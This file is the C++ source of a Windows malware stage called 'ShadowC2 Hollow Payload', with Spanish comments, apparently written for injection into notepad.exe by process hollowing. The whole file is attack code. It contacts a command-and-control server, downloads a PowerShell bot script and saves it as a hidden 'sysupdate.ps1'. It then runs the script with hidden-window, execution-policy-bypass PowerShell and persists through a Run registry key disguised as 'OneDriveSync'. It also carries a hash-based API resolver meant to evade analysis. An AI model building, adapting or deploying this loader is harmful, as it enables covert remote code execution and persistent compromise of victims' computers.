/**
 * ShadowC2 - Hollow Payload
 * Este PE se inyecta en notepad.exe via Process Hollowing
 * Compilar: x86_64-w64-mingw32-g++ -o hollow_payload.exe hollow_payload.cpp \
 *           -lwininet -s -O2 -static -Wl,--subsystem,windows
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define C2_IP "192.168.1.6"
#define C2_PORT 8000
#define C2_PATH "/static/payloads/bot_stealth.ps1"

// ============ DEFINICIONES PEB (MinGW no las incluye) ============
typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} MY_UNICODE_STRING, *PMY_UNICODE_STRING;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    ULONG CrossProcessFlags;
    PVOID KernelCallbackTable;
    ULONG SystemReserved;
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
} MY_PEB, *PMY_PEB;

// ============ RESOLVER APIs DINAMICAMENTE ============
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, 
    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *pGetTempPathA)(DWORD, LPSTR);

DWORD hash_str(const char* s) {
    DWORD h = 0x1505;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

PVOID resolve_api(DWORD h) {
    PMY_PEB peb = (PMY_PEB)__readgsqword(0x60);
    PMY_PEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    
    for (PLIST_ENTRY entry = head->Flink; entry != head; entry = entry->Flink) {
        PMY_LDR_DATA_TABLE_ENTRY mod = (PMY_LDR_DATA_TABLE_ENTRY)((BYTE*)entry - sizeof(LIST_ENTRY));
        HMODULE base = (HMODULE)mod->DllBase;
        
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + 
            nt->OptionalHeader.DataDirectory[0].VirtualAddress);
        
        if (!exp) continue;
        
        PDWORD names = (PDWORD)((BYTE*)base + exp->AddressOfNames);
        PWORD ords = (PWORD)((BYTE*)base + exp->AddressOfNameOrdinals);
        PDWORD funcs = (PDWORD)((BYTE*)base + exp->AddressOfFunctions);
        
        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            char* name = (char*)((BYTE*)base + names[i]);
            DWORD hh = 0x1505;
            while (*name) hh = ((hh << 5) + hh) + *name++;
            if (hh == h) return (PVOID)((BYTE*)base + funcs[ords[i]]);
        }
    }
    return nullptr;
}

// ============ ENTRY POINT ============
extern "C" void __stdcall payload_main() {
    // Usar GetProcAddress directo para simplicidad en el lab
    pLoadLibraryA LoadLibraryA = (pLoadLibraryA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    pGetProcAddress GetProcAddress = (pGetProcAddress)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    
    HMODULE hKernel = LoadLibraryA("kernel32.dll");
    HMODULE hWininet = LoadLibraryA("wininet.dll");
    
    pGetTempPathA GetTempPathA = (pGetTempPathA)GetProcAddress(hKernel, "GetTempPathA");
    pCreateFileA CreateFileA = (pCreateFileA)GetProcAddress(hKernel, "CreateFileA");
    pWriteFile WriteFile = (pWriteFile)GetProcAddress(hKernel, "WriteFile");
    pCloseHandle CloseHandle = (pCloseHandle)GetProcAddress(hKernel, "CloseHandle");
    pCreateProcessA CreateProcessA = (pCreateProcessA)GetProcAddress(hKernel, "CreateProcessA");
    
    typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
    
    pInternetOpenA InternetOpenA = (pInternetOpenA)GetProcAddress(hWininet, "InternetOpenA");
    pInternetOpenUrlA InternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(hWininet, "InternetOpenUrlA");
    pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(hWininet, "InternetReadFile");
    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hWininet, "InternetCloseHandle");
    
    // Descargar bot.ps1
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        1, NULL, NULL, 0);
    
    if (!hInternet) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d%s", C2_IP, C2_PORT, C2_PATH);
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
        0x80000000 | 0x04000000, 0);
    
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return;
    }
    
    // Contar tamaño
    BYTE buffer[4096];
    DWORD bytesRead;
    DWORD totalSize = 0;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        totalSize += bytesRead;
    }
    InternetCloseHandle(hUrl);
    
    // Reabrir y leer
    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
        0x80000000 | 0x04000000, 0);
    
    BYTE* payload = (BYTE*)VirtualAlloc(NULL, totalSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD offset = 0;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        memcpy(payload + offset, buffer, bytesRead);
        offset += bytesRead;
    }
    payload[offset] = 0;
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    // Guardar en temp
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char psPath[MAX_PATH];
    snprintf(psPath, sizeof(psPath), "%s\\sysupdate.ps1", tempPath);
    
    HANDLE hFile = CreateFileA(psPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, payload, offset, &written, NULL);
        CloseHandle(hFile);
    }
    
    // Ejecutar PowerShell
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File \"%s\"",
        psPath);
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // Persistencia
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "OneDriveSync", 0, REG_SZ,
            (BYTE*)cmd, strlen(cmd) + 1);
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    payload_main();
    return 0;
}
